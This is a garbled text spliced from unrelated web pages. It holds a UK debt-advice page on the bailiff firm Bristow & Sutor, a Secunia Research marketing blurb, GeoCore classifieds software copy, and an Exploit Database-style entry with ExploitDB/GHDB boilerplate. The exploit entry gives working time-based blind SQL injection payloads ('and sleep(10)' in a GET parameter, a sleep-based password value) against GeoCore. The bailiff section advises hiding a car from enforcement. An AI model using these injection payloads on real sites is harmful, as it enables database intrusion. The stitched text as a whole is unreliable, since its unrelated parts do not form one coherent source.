## Who are Bristow and Sutor Enforcement?

Bristow and Sutor Enforcement Agents (previously called bailiffs) hold a certificate, which is granted by a judge at the county court, this certificate allows them carry out enforcement action.

All enforcement agents are regulated by the Ministry of Justice.

Bristow & Sutor provide Enforcement and Debt Collection Services for 203 Councils in England and Wales.

They collect Council Tax, Business Rates, Parking Penalty Charge Notices and Commercial Rent Arrears.

They also have a sister company called Credit Security. This is a debt collection agency that collects debts relating to overpaid housing benefit and rent arrears.

## Are Bristow & Sutor Legitimate?

![Bristow and Sutor Reviews](img/bristow-sutor-reviews.png "Bristow and Sutor Reviews")

You can check whether the bailiff is registered at the [**Certificated Bailiff Register.**](http://certificatedbailiffs.justice.gov.uk/CertificatedBailiffs/)

This register holds details of all enforcement agents (previously called bailiffs) who hold a certificate, granted by a judge at the county court. You can search by an enforcement agent's or applicant's name.

Only "fit and proper" individuals should hold these certificates.

If you know of serious conduct issues which would mean that an existing enforcement agent, or an applicant for a certificate, is not a "fit and proper" person, you can use this register to find out which court you should alert to these issues.

If you have any concerns or doubts over the bailiff please call us on **0800 3688 133** and we will check if they are real for you.

## Enforcement Officer and Bailiff Scam

We have become aware of scammers phoning members of the public, posing as County Court bailiffs, High Court Enforcement Officers (HCEOs) and Certificated Enforcement Agents (CEAs).

In a number of cases they are claiming to be a bailiff at Northampton County Court.

Please stay vigilant against fraudsters posing as enforcement officers and bailiffs, for more information please visit;  [https://www.gov.uk](https://www.gov.uk/government/news/guidance-on-bailiff-and-enforcement-officer-scam)

## What can they do?

They have the legal power to remove and sell your belongings to pay a debt you owe. In most cases, bailiffs only get involved after your creditor has taken you to court.

If you let a bailiff into your home they can take:

* luxury items, such as a TV or games console
* things you own jointly with someone else
* money, jewellery and antiques

They can not take:

* things you need to live, eg your clothes, cooker, fridge
* work tools and equipment which together are worth less than Â£1,350
* someone elseâs belongings, eg your partnerâs computer

Proving that the items don't belong to you isn't always easy.

## Who do Bristow and Sutor Collect Debts for?

Bristow and Sutor specialise in collecting debts owed to local councils.

If you owed money to a county council, whether from council tax, business rates, unpaid parking fines, or traffic infringements like driving in a bus lane and the council were unable to collect it, they may have passed that debt onto Bristow and Sutor enforcement.

## If Bristow and Sutor have taken your goods.

If the bailiff has taken your goods you can still get them back, but you will have to:

* Settle your debt before the goods are sold by Bristow & Sutor.
* Make an agreement with your creditor and get them to ask Bristow & Sutor to return your goods.
* You buy the goods back yourself.
* Prove that the Bristow & Sutor bailiff did not follow the correct procedure when they took your goods.

![Bristow and Sutor Car](img/bristow-sutor-clamped-car.png "Bristow and Sutor Car")

## Can Bristow & Sutor take my car?

Cars are one of the most popular things for a bailiff to seize. This is because they usually have value, are easy to seize and also for the bailiff to sell on.

Bailiffs are allowed to take cars and vehicles, but they have to follow certain rules.

* A Bailiff can only take control of a vehicle that's actually owned solely or jointly by the debtor.
* A car belonging to a third-party cannot be taken. So if your car is on a HP or lease agreement they can not take it.
* A car displaying a Blue Disabled Badge cannot be taken.

Alternatively, the bailiff may leave the car with you as long as you to sign a controlled goods agreement, this means you promise that you won't try to sell or get rid of the vehicle and agree to a payment plan. If you don't keep to the terms of this repayment plan, the bailiff will come back and seize your vehicle.

 **Call the Bailiff Helpline on 0800 3688 133 if you need help with a bailiff and your vehicle.**

## The bailiff has clamped my car, can I remove the clamp?

No, do not remove the clamp from your vehicle.

Under section 68.1 of Schedule 12 (TCEA 2007) it is a serious offence to remove a wheel clamp or to obstruct the bailiff from clamping or removing the vehicle. You risk being fined or sent to prison for a term not exceeding 51 weeks!

Top Tip: Hide your car

If you don't want your car to be taken, you can park it on private land, such as a friend's driveway or a car park.

A bailiff can take your car if it is parked on a public highway, but they can't take a car parked on private land belonging to someone else without a court order.

## What can they charge?

How much the bailiff can charge will depend on your situation.

The fees that a Bristow & Sutor bailiff/enforcement agent can charge are outlined under the Taking Control of Goods (Fees) Regulations 2014.

There are three separate stages of baliff action, called **compliance, enforcement and sale of goods.**

Bristow & Sutor are therefore allowed to charge a fee for each stage of the process of taking action against you.

However, **the bailiff fees can only be charged once for each stage of the process**, no matter how much work was involved in that stage of the process. So even if a bailiff had to visit your home four times during the enforcement stage, they can only charge the enforcement fee once.

The fees can quickly add up though, and we think the Â£75 fee for issuing the **"enforcement notice"**, which is basically just a standard letter, is excessive.

For each stage the bailiffs can charge two fees, as detailed in the table below:

| Stage of collection | Bailiff Action | Fixed Fee | % Fee (over Â£1500 only) |
| --- | --- | --- | --- |
| **Compliance** | Sending you an enforcement notice through the post, requesting payment. | Â£75 | 0% |
| **Enforcement** | Visiting your home or business premises to take control of goods. | Â£235 | 7.5% |
| **Sale of Goods** | Removing and selling your goods/belongings. | Â£110 | 7.5% |

So if you have received an "enforcement notice" from Bristow and Sutor through the post, don't ignore it. If you do not contact them they will proceed to stage two and charge you another Â£235, when they send a bailiff to knock on your door.

It may not be too late for you to negotiate a payment scheme with a bailiff on your own.

However, we suggest that you contact us immediately for free advice, we can easily deal with Bristow & Sutor for you.

Call the Bailiff Helpline on **0800 3688 133**

## Other charges they can make.

As well as the fixed fees and percentage fees shown above, you may also be charged by Bristow & Sutor for disbursements. These can include the following:

* Storage costs for your belongings after they were taken away by Bristow & Sutor.
* Locksmith costs.
* Any court fees Bristow & Sutor had to pay if they needed to apply to the court at any point.
* Auctioneer's costs if they have sold your goods, including commission of up to 15 per cent of the selling price, out-of-pocket expenses and advertising the sale of your goods.

For all expenses charged by Bristow and Sutor, you have the right to see receipts and other evidence for the costs they have added to your bill.

## Can I avoid bailiff fees by paying the Council or Magistrate Court direct?

The short answer to this is "NO".

Once a warrant or liability order has been passed to the enforcement agency and the enforcement agency has issued a "notice of enforcement", the bailiff fees becomes legally due and the âamount outstandingâ will include the bailiff fees.

## What time do Bristow and Sutor bailiffs work till?

They can attend your property between the hours of 6am and 9pm.

Enforcement should not be undertaken on Sundays, on Good Friday or on Christmas Day.

However they can carry out enforcement outside of these hours under the following circumstances:

* If they have a court order saying they are entitled to operate outside the hours of 6am to 9pm
* If your belongings of value are at a premises that trades outside the hours of 6am to 9pm, at a business premises for example, then the Bailiff can visit during this time. A good example of this would be a pub, restaurant or club.
* If a Bailiff is in the process of seizing your belongings within the hours of 6am - 9pm but they have not finished before 9pm, then they may stay and complete their enforcement.

## How many times can a bailiff visit?

![When can Bristow and Sutor visit](img/when-can-bristow-and-sutor-visit.png "When can Bristow and Sutor visit")

We often hear "they can only visit three times then they have to hand the debt back". This is not true.

Their is no fixed number of times a bailiff can visit you to try to recover the debt.

However eventually they may return the warrant to the court or local authority if they are unable to gain entry, or you do not have enough goods to pay off the debt and fees.

The ony way to stop visits is to arrange an agreement for the outstanding debt to be paid.

## Can I be arrested for not paying a bailiff?

No, a bailiff can not arrest you. They also can not call the police to arrest you unless it is to prevent a breach of the peace. EG you have theatened them with violence.

You cannot be arrested for refusing to allow a bailiff into your home.

You cannot go to prison for not paying your debts. However, non-payment of council tax, child maintenance or magistrates court fines can lead to imprisonment if you 'wilfully refuse' to pay.

This means that you have the money but choose not to pay.

You would be told to attend a magistrates court âmeans enquiry hearingâ before this is decided.

This gives you the chance to explain why you have not paid.

## Broken payment arrangement

![payment plan Bristow and Sutor](img/payment-plan-bristow-and-sutor.png "payment plan Bristow and Sutor")

Bristow and Sutor will cancel your repayment plan if you miss an agreed payment date or pay less than the agreed amount.

This often happens because the payment plan they forced you to make was simply too high and unaffordable.

Therefore it was only a matter of time until a payment was missed, and they could add more fees onto the job.

If they cancel your payment plan they will move your case to enforcement. This means an agent will visit your home.

They will not offer or negotiate with you to put a new repayment plan in place.

IMPORTANT!!! If this has happened to you call our helpline now on freephone **0800 3688133**. We can force the bailiffs to accept a new AFFORDABLE repayment plan from you.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

GeoCore is the new name for all Geodesic Solutions software packages beginning with version 7.0.0.

The products previously known as:

GeoClassAuctions Enterprise
GeoClassifieds Enterprise
GeoClassifieds Premier
GeoClassifieds Basic
GeoAuctions Enterprise
GeoAuctions Premier
are now unified into a single product.

Sites running GeoCore may use both Classifieds and Auctions, or may turn off one or the other as needed. Additional item types may be added in the future.

GeoCore allows much greater flexibility for you, the customer: many features previously available only in the Enterprise-level software packages have been opened up to everyone, either as built-in features or Add Ons that may be purchased separately. With GeoCore, you now have the power to build exactly the type of site you want: add the features you need, leave the ones you don't, and add more Add Ons to your site at any time!

GeoCore is the next step forward for Geodesic Solutions, and a powerful revolution in the field of Classifieds and Auctions software. Contact us today to find out how GeoCore can help you!

Geocore is a premium version {

GeoCore - Classifieds : $399.00 USD
GeoCore - Auctions : $399.00 USD
GeoCore - MAX : $499.00 USD

}

| Time-Based Blind Injection     |
+--------------------------------+

1) param : b  | method : GET

http://server/index.php?a=5&b=15 {Inject here}

Real exploitation :

https://server/index.php?a=5&b=15 and sleep(2) &filterValue=1997&page=2&setFilter=cs_94

==> will pause for 2 seconds and diplay the page after

https://server/index.php?a=5&b=15 and sleep(10) &filterValue=1997&page=2&setFilter=cs_94
==> will pause for 10 seconds and diplay the page after depending on load of files(imgs , css , js scripts)

2) Vuln URL : /register.php?b=1 | URL encoded POST input c[password] set to secret"=sleep(3)="

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
